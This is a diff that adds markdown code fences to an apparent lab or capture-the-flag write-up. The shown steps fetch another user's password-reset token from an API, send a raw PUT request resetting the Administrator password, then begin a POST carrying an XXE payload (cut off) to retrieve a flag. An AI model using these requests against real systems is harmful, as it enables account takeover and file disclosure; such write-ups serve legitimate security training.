@@ -147,7 +147,7 @@ The XXE xml payload:
 3. Request the /api.php/token/52 - Response: 
 {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
 4. Request to change the password of the Administrator
-
+```
 PUT /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne HTTP/1.1
 Host: 94.237.59.180:54333
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -164,11 +164,11 @@ Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=74
 Sec-GPC: 1
 
 uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne
-
+```
 5. Login to admin account
 
 6. Request to retrieve the flag with XXE payload:
-
+```
 POST /addEvent.php HTTP/1.1
 Host: 94.237.59.180:54333
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -183,6 +183,7 @@ DNT: 1
 Connection: close
 Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=52
 Sec-GPC: 1
+```
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
